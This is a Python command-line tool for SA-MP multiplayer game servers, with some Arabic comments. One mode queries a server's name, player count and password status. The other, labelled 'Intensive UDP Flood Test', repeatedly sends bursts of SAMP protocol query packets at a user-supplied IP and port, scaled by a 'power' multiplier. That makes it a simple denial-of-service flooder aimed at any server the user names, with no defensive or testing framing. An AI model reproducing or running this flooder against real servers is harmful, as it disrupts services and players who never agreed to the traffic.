#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, socket, struct

class color:
    HEADER = '\033[0m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'

logo = color.HEADER + '''
   ███████╗ █████╗ ███╗   ███╗██████╗ 
   ██╔════╝██╔══██╗████╗ ████║██╔══██╗
   ███████╗███████║██╔████╔██║██████╔╝
   ╚════██║██╔══██║██║╚██╔╝██║██╔═══╝ 
   ███████║██║  ██║██║ ╚═╝ ██║██║     
                                    
           SAMP Direct Interactive Tool
           Version: 5.0-DirectInput
###################################################
'''
print(logo)

def query_samp_info(ip, port):
    """دالة ذكية لفحص وجلب معلومات سيرفر SAMP مباشرة"""
    try:
        ip_bytes = socket.inet_aton(ip)
        packet = b'SAMP' + ip_bytes + struct.pack('<H', port) + b'i'
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2.0)
        sock.sendto(packet, (ip, port))
        
        data, addr = sock.recvfrom(2048)
        sock.close()
        
        if len(data) > 11 and data[:4] == b'SAMP':
            i = 11
            password = data[i]; i += 1
            players = struct.unpack('<H', data[i:i+2])[0]; i += 2
            max_players = struct.unpack('<H', data[i:i+2])[0]; i += 2
            name_len = struct.unpack('<I', data[i:i+4])[0]; i += 4
            server_name = data[i:i+name_len].decode('latin1', errors='ignore')
            
            return {
                "status": "Online",
                "password": bool(password),
                "players": players,
                "max_players": max_players,
                "name": server_name
            }
    except socket.timeout:
        return {"status": "Offline / Timeout"}
    except Exception as e:
        return {"status": "Error", "details": str(e)}
    
    return {"status": "No Response"}

while True:
    print('')
    try:
        print("\nChoose Operation Mode:")
        print("1. Smart Query & Status Check (فحص ذكي وجلب معلومات سيرفر محدد)")
        print("2. Intensive UDP Flood Test (إرسال حزم UDP مكثفة وذكية مباشرة للهدف)")
        
        choice = input("\n[▸] Enter your choice (1 or 2): ").strip()
        
        if choice == '1':
            print(f"\n{color.YELLOW}--- Smart Query Configuration ---{color.HEADER}")
            target_ip = input("[▸] Enter target SAMP IP address: ").strip()
            if not target_ip:
                print(f"{color.RED}[!] IP cannot be empty!{color.HEADER}")
                continue
            target_port = int(input("[▸] Enter target SAMP Port (Default 7777): ") or "7777")
            
            print(f"\n{color.CYAN}[*] Querying {target_ip}:{target_port} ...{color.HEADER}\n")
            res = query_samp_info(target_ip, target_port)
            
            if res.get("status") == "Online":
                print(f"{color.GREEN}[ONLINE]{color.HEADER}")
                print(f"    ↳ Name: {res.get('name')}")
                print(f"    ↳ Players: {res.get('players')} / {res.get('max_players')}")
                print(f"    ↳ Password Protected: {'Yes' if res.get('password') else 'No'}")
            else:
                print(f"{color.RED}[OFFLINE / UNREACHABLE]{color.HEADER}")
                
        elif choice == '2':
            print(f"\n{color.YELLOW}--- UDP Flood Configuration ---{color.HEADER}")
            target_ip = input("[▸] Enter target SAMP IP address: ").strip()
            if not target_ip:
                print(f"{color.RED}[!] Target IP cannot be empty!{color.HEADER}")
                continue
                
            target_port = int(input("[▸] Enter target SAMP Port (Default 7777): ") or "7777")
            power = int(input("[▸] Enter intensity/rounds multiplier (Default 50): ") or "50")
            
            print(f"\n{color.YELLOW}[+] Target set to -> {target_ip}:{target_port} with power level {power}{color.HEADER}")
            engage = input("[*] Ready to launch UDP transmission? <Y/n>: ").strip().lower()
            
            if engage.startswith('y'):
                print(f"\n{color.CYAN}[*] Starting UDP transmission... Please wait.{color.HEADER}")
                
                try:
                    target_ip_bytes = socket.inet_aton(target_ip)
                except Exception:
                    print(f"{color.RED}[!] Invalid IP address format!{color.HEADER}")
                    continue
                    
                samp_payloads = [
                    b'SAMP' + target_ip_bytes + struct.pack('<H', target_port) + b'i', 
                    b'SAMP' + target_ip_bytes + struct.pack('<H', target_port) + b'r', 
                    b'SAMP' + target_ip_bytes + struct.pack('<H', target_port) + b'c', 
                    b'SAMP' + target_ip_bytes + struct.pack('<H', target_port) + b'd'  
                ]
                
                total_sent = 0
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.2)

                for round_idx in range(power):
                    try:
                        for payload in samp_payloads:
                            sock.sendto(payload, (target_ip, target_port))
                            total_sent += 1
                    except Exception:
                        pass
                    print(f"[+] Round {round_idx + 1}/{power} completed. Packets sent: {total_sent}")
                
                sock.close()
                print(f"\n{color.GREEN}[✓] Operation Complete! Total UDP packets sent: {total_sent}{color.HEADER}")
            else:
                print("[!] Operation cancelled.")
                
        else:
            print("[!] Invalid choice.")

        cont = input("\n[*] Run again? <Y/n>: ").lower()
        if not cont.startswith('y'):
            print("[•] Exiting. Have a wonderful day!")
            break

    except Exception as e:
            print(f'{color.RED}[✘] Error: {e}{color.HEADER}')
            break
.